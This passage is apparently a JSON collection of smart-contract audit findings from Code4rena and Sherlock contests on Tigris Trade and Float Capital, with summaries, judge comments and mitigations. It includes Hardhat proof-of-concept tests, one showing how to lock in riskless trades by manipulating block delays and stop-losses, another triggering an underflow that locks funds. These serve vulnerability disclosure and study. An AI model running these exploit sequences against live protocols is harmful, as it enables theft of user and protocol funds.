priceData[5]]\n          )\n        );\n        sig = await node.signMessage(\n          Buffer.from(message.substring(2), 'hex')\n        )\n\n        // Add to position\n        await trading.connect(user).addToPosition(\n          1,\n          \"1\",\n          priceData,\n          sig,\n          stablevault.address,\n          MockDAI.address,\n          permitData,\n          user.address,\n        )\n\n\n\n        // ============================================================== //\n        // ====================== Bots cannot close ===================== //\n        // ============================================================== //\n\n        // Bots cannot close the position even if the price is down below the stop loss\n        await expect(trading.connect(user).limitClose(\n          1,          // id\n          false,      // take profit\n          priceData,  // price data\n          sig,        // signature\n        )).to.be.revertedWith(\"0\") // checkDelay\n\n        // They can also not liquidate the position because the price is not down enough\n        // If the price falls close to the liquidation zone, we can add more margin or simply close\n        // the position, netting us the stop-loss price.\n        await expect(trading.connect(user).liquidatePosition(\n          1,          // id\n          priceData,  // price data\n          sig,        // signature\n        )).to.be.reverted\n\n\n\n\n        // ============================================================== //\n        // =============== Increase SL when price is up  ================ //\n        // ============================================================== //\n\n        // Sign the price data (price has 5x'ed from initial price)\n        priceData = [\n          node.address,                                   // provider\n          0,                                              // asset id\n          parseEther(\"5000\"),                             // price\n          10000000,                                       // spread (0.1%)\n          (await ethers.provider.getBlock()).timestamp,   // timestamp\n          false                                           // is closed\n        ]\n        message = ethers.utils.keccak256(\n          ethers.utils.defaultAbiCoder.encode(\n            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n            [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]\n          )\n        );\n        sig = await node.signMessage(\n          Buffer.from(message.substring(2), 'hex')\n        )\n\n        // Update stop loss right at the current price\n        await trading.connect(user).updateTpSl(\n          false,                // type (sl)\n          1,                    // id\n          parseEther(\"5000\"),   // sl price\n          priceData,            // price data\n          sig,                  // signature\n          user.address,        // trader\n        )\n      }\n\n\n\n\n\n      // ============================================================== //\n      // ======================== Close order  ======================== //\n      // ============================================================== //\n\n      // When we are happy with the profit, we stop increasing the delay and close the position\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", [10])\n      for (let n = 0; n < blockDelay; n++) {\n        await network.provider.send(\"evm_mine\")\n      }\n\n      // Close order\n      await trading.connect(user).limitClose(\n        1,          // id\n        false,      // take profit\n        priceData,  // price data\n        sig,        // signature\n      )\n\n      // Withdraw to DAI\n      const amount = await stabletoken.balanceOf(user.address)\n      await stablevault.connect(user).withdraw(MockDAI.address, amount)\n\n      // Print results\n      const daiAtEnd = await mockDAI.balanceOf(user.address)\n      const tenPow18 = \"1000000000000000000\"\n      const diff = (daiAtEnd - daiAtBeginning).toString() / tenPow18\n      console.log(`Profit: ${diff} DAI`)\n    })\n})\n```\n\n**[GainsGoblin (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/67)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/67#issuecomment-1383681527):**\n > The warden has shown how, through the combination of: finding a way to re-trigger the delayCheck, altering SL and TP prices, a trader can prevent their position from being closed, creating the opportunity for riskless trades.\n> \n> Because of the broken invariants, and the value extraction shown, I agree with High Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/67#issuecomment-1407130700):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173125 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `Trading` contract that allows for riskless trades. This exploit is based on three principles: the stop-loss of a position can be updated without any delay checks, positions can only be closed after the block delay has been passed, and the block delay can be continuously renewed for a negligible cost.\n\nUsing these principles, a malicious trader can open a long limit order and execute it, then continuously renew the block delay while watching the price development. If the price goes up, they can call `updateTpSl()` to lock in the increased price. If the price goes down, they can prevent the position from being closed by continuously calling `addToPosition` with 1 wei when the block delay comes close to running out. When they have captured enough price movement, they can finally let the delay run out and call `limitClose()` to close the order at the peak stop-loss.\n\nThe recommended mitigation is to modify the delay checking in `limitClose()` to also consider whether the position is below the stop-loss. A proof of concept is provided in the report.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/67",
      "tags": [],
      "finders": [
        "Bobface"
      ]
    },
    {
      "id": "6320",
      "title": "[H-01] Lock.sol: assets deposited with Lock.extendLock function are lost",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105>\n\n### Impact\n\nThe `Lock` contract (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10>) allows end-users to interact with bonds.\n\nThere are two functions that allow to lock some amount of assets. The first function is `Lock.lock` (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76>) which creates a new bond. The second function is `Lock.extendLock` (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92>). This function extends the lock for some `_period` and / or increases the locked amount by some `_amount`.\n\nThe issue is that the `Lock.extendLock` function does not increase the value in `totalLocked[_asset]`. This however is necessary because `totalLocked[_asset]` is reduced when `Lock.release` (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105>) is called.\n\nTherefore only the amount of assets deposited via `Lock.lock` can be released again. The amount of assets deposited using `Lock.extendLock` can never be released again because reducing `totalLocked[_asset]` will cause a revert due to underflow.\n\nSo the amount of assets deposited using `Lock.extendLock` is lost.\n\n### Proof of Concept\n\n1.  User A calls `Lock.lock` to lock a certain `_amount` (amount1) of `_asset` for a certain `_period`.\n2.  User A calls then `Lock.extendLock` and increases the locked amount of the bond by some amount2\n3.  User A waits until the bond has expired\n4.  User A calls `Lock.release`. This function calculates `totalLocked[asset] -= lockAmount;`. Which will cause a revert because the value of `totalLocked[asset]` is only amount1\n\nYou can add the following test to the `Bonds` test in `Bonds.js`:\n\n```javascript\ndescribe(\"ReleaseUnderflow\", function () {\n    it(\"release can cause underflow\", async function () {\n        await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(\"110\"));\n        // Lock 100 for 9 days\n        await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(\"100\"), 9);\n\n        await bond.connect(owner).setManager(lock.address);\n\n        await stabletoken.connect(user).approve(lock.address, ethers.utils.parseEther(\"10\"));\n\n        // Lock another 10\n        await lock.connect(user).extendLock(1, ethers.utils.parseEther(\"10\"), 0);\n\n        await network.provider.send(\"evm_increaseTime\", [864000]); // Skip 10 days\n        await network.provider.send(\"evm_mine\");\n\n        // Try to release 110 after bond has expired -> Underflow\n        await lock.connect(user).release(1);\n    });\n});\n```\n\nRun it with `npx hardhat test --grep \"release can cause underflow\"`.\\\nYou can see that it fails because it causes an underflow.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nAdd `totalLocked[_asset] += amount` to the `Lock.extendLock` function.\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/23)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/23#issuecomment-1383078283):**\n > The warden has shown an issue with accounting that will cause principal deposits added via `extendLock` to be lost, for this reason I agree with High Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/23#issuecomment-1407130352):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419172200\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `Lock` contract in the code-423n4/2022-12-tigris repository which allows end-users to interact with bonds. There are two functions that allow to lock some amount of assets. The first function is `Lock.lock` which creates a new bond and the second function is `Lock.extendLock` which extends the lock for some `_period` and / or increases the locked amount by some `_amount`. \n\nThe issue is that the `Lock.extendLock` function does not increase the value in `totalLocked[_asset]`. This however is necessary because `totalLocked[_asset]` is reduced when `Lock.release` is called. Therefore only the amount of assets deposited via `Lock.lock` can be released again. The amount of assets deposited using `Lock.extendLock` can never be released again because reducing `totalLocked[_asset]` will cause a revert due to underflow, causing the assets to be lost.\n\nThe recommended mitigation step is to add `totalLocked[_asset] += amount` to the `Lock.extendLock` function. This bug can be tested using the code provided in the report and running it with npx hardhat test --grep \"release can cause underflow\".",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/23",
      "tags": [],
      "finders": [
        "csanuragjain",
        "HollaDieWaldfee",
        "sha256yan",
        "kaliberpoziomka8552",
        "cccz",
        "0xbepresent",
        "Ruhum",
        "0xsomeone",
        "rvierdiiev",
        "ali_shehab"
      ]
    },
    {
      "id": "5671",
      "title": "M-2: An update gap in Chainlink's feed can malfunction the whole market",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-float-capital-judging/issues/42 \n\n## Found by \nWATCHPUG\n\n## Summary\n\nThe `roundId` that is used for settling the price change and pushing the `latestExecutedEpochIndex` forward is strictly limited to be in a precise period of time. When there is no such `roundId`, the system will freeze and lock everyone out.\n\n## Vulnerability Detail\n\nThe check at L127 makes it impossible to use a roundId that was created at a later time than `relevantEpochStartTimestampWithMEWT + EPOCH_LENGTH`.\n\nHowever, when the `EPOCH_LENGTH` is larger than the Chainlink feed's heartbeat length, or Chainlink failed to post a feed within the expected heartbeat for whatever reason, then it would be impossible to find a suitable roundId (as it does not exist) to push the epoch forward due to the rather strict limitation for the roundId.\n\n## Impact\n\nAs a result, the whole system will malfunction and no one can enter or exit the market.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-float-capital/blob/main/contracts/market/template/MarketCore.sol#L188-L195\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider allowing the `roundId` not to falls into the epoch, and use the previous roundId's price when that's the case:\n\n```diff\n    for (uint32 i = 0; i < lengthOfEpochsToExecute; i++) {\n      // Get correct data\n      (, int256 currentOraclePrice, uint256 currentOracleUpdateTimestamp, , ) = chainlinkOracle.getRoundData(oracleRoundIdsToExecute[i]);\n\n      // Get Previous round data to validate correctness.\n-      (, , uint256 previousOracleUpdateTimestamp, , ) = chainlinkOracle.getRoundData(oracleRoundIdsToExecute[i] - 1);\n+      (, int256 previousOraclePrice, uint256 previousOracleUpdateTimestamp, , ) = chainlinkOracle.getRoundData(oracleRoundIdsToExecute[i] - 1);\n\n      // Check if there was a 'phase change' AND the `_currentOraclePrice` is zero.\n      if ((oracleRoundIdsToExecute[i] >> 64) > (latestExecutedOracleRoundId >> 64) && previousOracleUpdateTimestamp == 0) {\n        // NOTE: if the phase changes, then we want to correct the phase of the update.\n        //       There is no guarantee that the phaseID won't increase multiple times in a short period of time (hence the while loop).\n        //       But chainlink does promise that it will be sequential.\n        // View how phase changes happen here: https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.7/dev/AggregatorProxy.sol#L335\n        while (previousOracleUpdateTimestamp == 0) {\n          // NOTE: re-using this variable to keep gas costs low for this edge case.\n          latestExecutedOracleRoundId = (((latestExecutedOracleRoundId >> 64) + 1) << 64) | uint64(oracleRoundIdsToExecute[i] - 1);\n\n          (, , previousOracleUpdateTimestamp, , ) = chainlinkOracle.getRoundData(latestExecutedOracleRoundId);\n        }\n      }\n\n      // This checks the price given is valid and falls within the correct window.\n      // see https://app.excalidraw.com/l/2big5WYTyfh/4PhAp1a28s1\n      if (\n        previousOracleUpdateTimestamp >= relevantEpochStartTimestampWithMEWT ||\n        currentOracleUpdateTimestamp < relevantEpochStartTimestampWithMEWT\n-        currentOracleUpdateTimestamp >= relevantEpochStartTimestampWithMEWT + EPOCH_LENGTH\n      ) revert InvalidOracleExecutionRoundId({oracleRoundId: oracleRoundIdsToExecute[i]});\n\n+      // If the new roundId does not falls into the epoch, use the prev roundId then\n+      if (currentOracleUpdateTimestamp >= relevantEpochStartTimestampWithMEWT + EPOCH_LENGTH) {\n+        currentOraclePrice = previousOraclePrice;\n+      }\n\n      if (currentOraclePrice <= 0) revert InvalidOraclePrice({oraclePrice: currentOraclePrice});\n\n      missedEpochPriceUpdates[i] = currentOraclePrice;\n\n      relevantEpochStartTimestampWithMEWT += EPOCH_LENGTH;\n    }\n```\n\n## Discussion\n\n**JasoonS**\n\nThanks - we had a long internal debate discussion about this.\n\nWe decided that it is best to make the parameters (such as epoch length) long enough such that this is extremely unlikely to happen.\n\nWe have done some extensive latency and heartbeat analysis on chainlink oracles - as well as had an in-details discussion about how gas price spikes can cause delays to prices being pushed on chain (a side note - this is why a large mewt/minimumExecutionWatingTime is required - otherwise a gas price spike/griefing attack would be more feasible). I'll link some of that to this issue in a bit if that is interesting to you.\n\nAnyway - getting back to this issue - we believe it is better to leave the market paused if such an anomaly happens and give us time to analyse what happened. It is a sort of risk protection mechanism. Either we upgrade market for a fix (which will be under timelock), or we deprecate the market.\n\nI think our users will appreciate our prudence.\n\nOne thing to consider is that withdrawals also won't be processed in this edge case (maybe a good think?). I'll have another chat with the team on that.\n\nAgree that your solution is pretty benign too since there will just be no price change.\n\n**moose-code**\n\n@WooSungD would be useful if you could post that graph of chainlink prices on the analysis we did. \n\n**moose-code**\n\nFor more context, a few weeks ago we had detailed disscussion with the chainlink team, as you can't even rely on the hearbeat with certainty. \n\nE.g. the heartbeat of 27sec on polygon still showed outliers where we waited for up to 180 seconds in some cases for a new price because of big gas spikes. This is why we conducted the analysis so carefully, we want to make sure that we don't miss a chainlink price.\n\nHowever if we do miss a price, the auto deprecation means the system fails very gracefully, the markets are paused and everyone can simply withdraw after a cooldown period. \n\n**WooSungD**\n\nHere are some graphs showing the distribution of heartbeat (in seconds) for ETH-USD price feed on Chainlink Polygon.\n\n<img width=\"1641\" alt=\"image\" src=\"https://user-images.githubusercontent.com/88306711/202707461-cb8107d9-436f-44aa-af73-e9801c12aae3.png\">\n\n\n<img width=\"1654\" alt=\"image\" src=\"https://user-images.githubusercontent.com/88306711/202707525-b0dbb6d1-fd10-4aaa-bd93-b30dae6ef8cb.png\">\n\n\nThe outliers for the heartbeat mean that our MEWT needs to be longer (longer than max outlier necessarily) to prevent front-running.\n\nThe causes of outliers ito heartbeat were network congestion and gas spikes, according to the Chainlink team\n\n**moose-code**\n\nAfter chatting with the chainlink team more on this, the one potential attack vector (that seems unrealistic) that I can point out is spamming the polygon chain to the point where it delays the chainlink price update from being mined until the point where no valid price exists.\n\nThis would be extremely expensive and simply cause the market to deprecate (no financial gain). \n\n**Evert0x**\n\nWe still think this is a high severity issue as it can make the protocol malfunction\n\n**Evert0x**\n\nDowngrading to medium severity as it's clear to the judges a large part of the protocol is specifically engineered to handle this case.",
      "summary": "\nThis bug report is about an update gap in Chainlink's feed which can malfunction the whole market. The issue was found by WATCHPUG and it is caused by a check at L127 which makes it impossible to use a roundId that was created at a later time than `relevantEpochStartTimestampWithMEWT + EPOCH_LENGTH`. As a result, the whole system will malfunction and no one can enter or exit the market. The code snippet and tool used for the audit is provided in the report. \n\nThe recommendation is to consider allowing the `roundId` not to fall into the epoch, and use the previous roundId's price when that's the case. After a discussion with the team, it was decided that it is best to make the parameters (such as epoch length) long enough such that this is extremely unlikely to happen. It was also noted that withdrawals also won't be processed in this edge case. The issue was downgraded to medium severity as it's clear to the judges a large part of the protocol is specifically engineered to handle this case.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Float Capital",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-float-capital-judging/issues/42",
      "tags": [
        "Chainlink"
      ],
      "finders": [
        "WATCHPUG",
        "Source: https://github.com/sherlock-audit/2022-11-float-capital-judging/issues/42"
      ]
    },
    {
      "id": "5228",
      "title": "M-4: Protocol won't work with `USDC` even though it is a token specifically mentioned in the docs",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-float-capital-judging/issues/21 \n\n## Found by \npashov, ctf\\_sec, 0x52\n\n## Summary\nThe protocol has requirements for values (for example 1e18) that would be too big if used with a 6 decimals token like `USDC` - `USDC` is mentioned as a token that will be used in the docs\n## Vulnerability Detail\nFor the mint functionality, a user has to transfer at least 1e18 tokens so that he can mint pool tokens - `if (amount < 1e18) revert InvalidActionAmount(amount);`. If the `paymentToken` used was `USDC` (as pointed out in docs), this would mean he would have to contribute at least 1e12 USDC tokens (more than a billion) which would be pretty much impossible to do. There is also another such check in `MarketExtended::addPoolToExistingMarket` with `require(initialActualLiquidityForNewPool >= 1e12, \"Insufficient market seed\");` - both need huge amounts when using a low decimals token like USDC that has 6 decimals.\n\n## Impact\nThe protocol just wouldn't work at all in its current state when using a lower decimals token. Since such a token was mentioned in the docs I set this as a High severity issue.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-float-capital/blob/main/contracts/market/template/MarketExtended.sol#L125\nhttps://github.com/sherlock-audit/2022-11-float-capital/blob/main/contracts/market/template/MarketCore.sol#L265\n## Tool used\n\nManual Review\n\n## Recommendation\nDrastically lower  the `require` checks so they can work with tokens with a low decimals count like `USDC`\n\n## Discussion\n\n**JasoonS**\n\nI feel really silly that I didn't think of that when I wrote the readme - we have spoken about it came up many times in the alpha version audit that we did last year. We have no intention of using USDC anytime soon. We have been using DAI exclusively. My mistake - I thought why not just have the option for insurance sake and mention USDC (since it is the only other token remotely likely that we might use).\n\nThis most certainly isn't `high` - it is in the constructor that we'd immediately notice that (of course as I mentioned we have been aware of this for a long time). The rest of the mechanism works with USDC - just those minimums will need to be adjusted.\n\nSo, \"_Bug in the readme?_\" I'd say this isn't a vulnerability at all!\n\nWe could fetch the `decimals` from the payment token on initialization, but honestly don't think the extra complexity is justified in our situation.\n\n\n**Evert0x**\n\nAs USDC was explicitly mentioned by the protocol we would like to reward this finding.",
      "summary": "\nThis bug report is about the protocol not working with USDC, a token specifically mentioned in the docs. It was found by pashov, ctf\\_sec, and 0x52. The issue is that the protocol requires values (such as 1e18) that are too large when used with a 6 decimals token like USDC, making it impossible to use. This issue was given a high severity as USDC was mentioned in the docs. The code snippets that were used to identify this issue can be found in the GitHub repository. The recommendation is to lower the require checks so they can work with tokens with a low decimals count like USDC. After discussion, it was decided that this was not a vulnerability and that the complexity of fetching the decimals from the payment token on initialization was not necessary. The finding was rewarded as USDC was explicitly mentioned by the protocol.",
      "quality_score": 4.333333333333333,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Float Capital",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-float-capital-judging/issues/21",
      "tags": [
        "Decimals",
        "USDC"
      ],
      "finders": [
        "pashov",
        "0x52",
        "Source: https://github.com/sherlock-audit/2022-11-float-capital-judging/issues/21",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3754",
      "title": "M-3: Funding Rate calculation is not correct",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-float-capital-judging/issues/33 \n\n## Found by \nobront\n\n## Summary\n\nAccording to the docs, the Funding Rate is intended to correspond to the gap between long and short positions that the Float Pool is required to make up. However, as its implemented, the `totalFunding` is calculated only on the size of the overbalanced position, leading to some unexpected situations.\n\n## Vulnerability Detail\n\nAccording to the comments, `totalFunding` is meant to be calculated as follows:\n\n> totalFunding is calculated on the notional of between long and short liquidity and 2x long and short liquidity. \n\nThis makes sense. The purpose of the funding rate is to compensate the Float Pool for the liquidity provided to balance the market.\n\nHowever, the implementation of this function does not accomplish this. Instead, `totalFunding` is based only on the size of the `overbalancedValue`:\n\n```solidity\nuint256 totalFunding = (2 * overbalancedValue * fundingRateMultiplier * oracleManager.EPOCH_LENGTH()) / (365.25 days * 10000);\n```\nThis can be summarized as `2 * overbalancedValue * funding rate percentage * epochs / yr`.\n\nThis formula can cause problems, because the size of the overbalanced value doesn't necessarily correspond to the balancing required for the Float Pool. \n\nFor these examples, let's set:\n- `fundingRateMultiplier = 100` (1%)\n- `EPOCH_LENGTH() = 3.6525 days` (1% of a year)\n\nSITUATION A:\n- Overbalanced: LONG\n- Long Effective Liquidity: 1_000_000 ether\n- Short Effective Liquidity: 999_999 ether\n- `totalFunding = 2 * 1_000_000 ether * 1% * 1% = 200 ether`\n- Amount of balancing supplied by Float = 1mm - 999,999 = 1 ether\n\nSITUATION B:\n- Overbalanced: LONG\n- Long Effective Liquidity: 1_000 ether\n- Short Effective Liquidity: 100 ether\n- `totalFunding = 2 * 1_000 ether * 1% * 1% = 0.2 ether`\n- Amount of balancing supplied by Float = 1000 - 100 = 900 ether\n\nWe can see that in Situation B, Float supplied 900X more liquidity to the system, and earned 1000X less fees.\n\n## Impact\n\nFunding Rates will not accomplish the stated objective, and will serve to incentivize pools that rely heavily on Float for balancing, while disincentivizing large, balanced markets.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-float-capital/blob/main/contracts/market/template/MarketCore.sol#L46-L58\n\n## Tool used\n\nManual Review, Foundry\n\n## Recommendation\n\nAdjust the `totalFunding` formula to represent the stated outcome. A simple example of how that might be accomplished is below, but I'm sure there are better implementations:\n\n```solidity\nuint256 totalFunding = ((overbalancedValue - underbalancedValue) * fundingRateMultiplier * oracle.EPOCH_LENGTH()) / (365.25 days * 10_000);\n```\n\n## Discussion\n\n**JasoonS**\n\nIt is acknowledged that this funding rate equation is just a placeholder for now.\n\nThis typo of funding rate equation is desired if we want to incentivise market makers to always keep liquidity in the Float pool regardless of market balance.\n\nOur initial implementation was EXACTLY the same as what you wrote in the recommendation (and it is exactly what has been deployed live for the alpha version of the protocol for the last year). But after talks with market makers it became clear that they want 'guaranteed' returns of sorts even if the market is balanced to keep their funds there.\n\nWe have (since audit) refined an updated equation that is a hybrid of the two extremes. This is some of the core logic that we'll have to keep iterating on to make float work. It is the magic sauce.\n\nApologies for that mistake in the comments. The comments also say: `This modular function is logical but naive implementation that will likely change somewhat upon more indepth modelling results that are still pending.`\n\nTLDR - this is as intended and the shortcomings are known.\n\n**Evert0x**\n\nDowngrading to informational as the docs on which this issue is based also indicate that it's a placeholder. Issue doesn't make a case for med/high in case the formula makes it to production.\n\n**zobront**\n\nEscalate for 5 USDC\n\nIt seems like quite a stretch to claim that the current implementation is a placeholder. The exact quote in the docs is:\n\n> This modular function is logical but naive implementation that will likely change somewhat upon more indepth modelling results that are still pending.\n\nThis clearly states that the function is supposed to accomplish what they state it will accomplish. They acknowledge it may change, but specifically lay out what the function should do and claim that it does it.\n\nIf saying this is right but may change somewhat disqualifies valid issues, then anything that says that should not be in scope. So I feel it is very clear that the report does find a real issue in the code.\n\nNow, I understand that if this was just an issue with the docs, itd be informational. Thats fair.\n\nBut the actual implementation isnt an alternative. Its a totally invalid way to implement the function that would cause harm to the platform.\n\nThe goal of the function is to ensure the Float pool is compensated for the real risk that it is taking on. If it is substantially underpaid (as it would be in many cases with the erroneous formula), it can easily cause the pool to lose funds. The formula doesn't accomplish the objective that is needed from it, and it puts the protocol's own funds at risk.\n\nThe fact that, since the audit, they have updated the equation seems to imply that they agree that the implementation in the audit code was untenable. \n\nSo it seems clear to me that:\na) the issue is a real mismatch between explicitly intended behavior and the code\nb) it would cause real harm if it was deployed as written\n\nTherefore, I believe a severity of Medium is justified.\n\n**sherlock-admin**\n\n > Escalate for 5 USDC\n> \n> It seems like quite a stretch to claim that the current implementation is a placeholder. The exact quote in the docs is:\n> \n> > This modular function is logical but naive implementation that will likely change somewhat upon more indepth modelling results that are still pending.\n> \n> This clearly states that the function is supposed to accomplish what they state it will accomplish. They acknowledge it may change, but specifically lay out what the function should do and claim that it does it.\n> \n> If saying this is right but may change somewhat disqualifies valid issues, then anything that says that should not be in scope. So I feel it is very clear that the report does find a real issue in the code.\n> \n> Now, I understand that if this was just an issue with the docs, itd be informational. Thats fair.\n> \n> But the actual implementation isnt an alternative. Its a totally invalid way to implement the function that would cause harm to the platform.\n> \n> The goal of the function is to ensure the Float pool is compensated for the real risk that it is taking on. If it is substantially underpaid (as it would be in many cases with the erroneous formula), it can easily cause the pool to lose funds. The formula doesn't accomplish the objective that is needed from it, and it puts the protocol's own funds at risk.\n> \n> The fact that, since the audit, they have updated the equation seems to imply that they agree that the implementation in the audit code was untenable. \n> \n> So it seems clear to me that:\n> a) the issue is a real mismatch between explicitly intended behavior and the code\n> b) it would cause real harm if it was deployed as written\n> \n> Therefore, I believe a severity of Medium is justified.\n\nYou've created a valid escalation for 5 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted. \n\n\n\n**sherlock-admin**\n\n> Escalation accepted. \n> \n> \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nA bug report has been raised on the Funding Rate calculation in the Float Capital protocol. The Funding Rate is intended to correspond to the gap between long and short positions that the Float Pool is required to make up, but the implementation of the function does not accomplish this. Currently, `totalFunding` is based only on the size of the `overbalancedValue`, which can lead to some unexpected situations. For example, if Float supplies 900X more liquidity to the system, they will earn 1000X less fees. This can cause problems, as it does not incentivize pools that rely heavily on Float for balancing, while disincentivizing large, balanced markets.\n\nThe code snippet for the function can be found at https://github.com/sherlock-audit/2022-11-float-capital/blob/main/contracts/market/template/MarketCore.sol#L46-L58.\n\nThe recommendation is to adjust the `totalFunding` formula to represent the stated outcome. A simple example of how that might be accomplished is provided.\n\nThe issue has been accepted for 5 USDC and contestants' payouts and scores will be updated accordingly.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Float Capital",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-float-capital-judging/issues/33",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "3509",
      "title": "M-1: Unsafe type casting of `poolValue` can malfunction the whole market",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-float-capital-judging/issues/45 \n\n## Found by \nWATCHPUG\n\n## Summary\n\nWhen `poolValue` is a negative number due to loss in `valueChange` and `funding`, the unsafe type casting from `int256` to `uint256` will result in a huge number close to `2**255` which will revert `_rebalancePoolsAndExecuteBatchedActions()` due to overflow when multiplied by 1e18 at L163.\n\n## Vulnerability Detail\n\nIf the funding rate is 100% per year and the `EPOCH_LENGTH` is 4 days, the funding fee for each epoch can be as much as ~1% on the effectiveValue.\n\nPlus, the loss from `valueChange` is capped at 99%, but combining both can still result in a negative `poolValue` at L146.\n\nAt L163 `uint256 price = uint256(poolValue).div(tokenSupply);` the type casting from `int256` to `uint256` will result in a huge number close to `2**255`.\n\n`MathUintFloat.div()` will overflow when a number as large as `2**255` is multiplied by 1e18.\n\n## Impact\n\n`_rebalancePoolsAndExecuteBatchedActions` will revert and cause the malfunction of the whole market.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-float-capital/blob/main/contracts/market/template/MarketCore.sol#L118-L185\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider adding a new function to properly handle the bankruptcy of a specific pool.\n\n## Discussion\n\n**JasoonS**\n\nWe seed the pools initially with sufficient un-extractable capital such that this shouldn't be an issue (it should never get close to 0 - even after millions of years and trillions of transactions that may have rounding down and all users withdrawing their funds).\n\nWe could create a safe cast function to check - but we made `poolValue` an int256 so that it is easier to operate on with other signed integers - not because it is ever possible for it to be negative. So it would be redundant in this case.\n\n**moose-code**\n\n@JasoonS Want to relook at this. @WooSungD @Stentonian maybe you also have thoughts. \n\nI believe watchpug is explaining something different. \n\nThey are saying that poolValue can be negative, as a 99% capped loss of poolValue, in conjunction with a 1% funding fee (imagine the side is very overbalanced), will result in the pool value losing more than 100% in total. \n\nA safe guard would be to check that with BOTH funding and value change, 99% is the maximum a pool can lose in any single iteration. \n\nGiven system parameterizations, where epoch length will never be that long and funding rate should never be that high, its unlikely this would be an issue in practice, but likely still worth making a change for. \n\nLet me know if anyone has thoughts \n\n**JasoonS**\n\nYes, you're right, went through these too fast.\n\nWe've discussed this internally a few times. This point should've made it into the readme.\n\nWe could add checks to the epoch length on construction to ensure were safe",
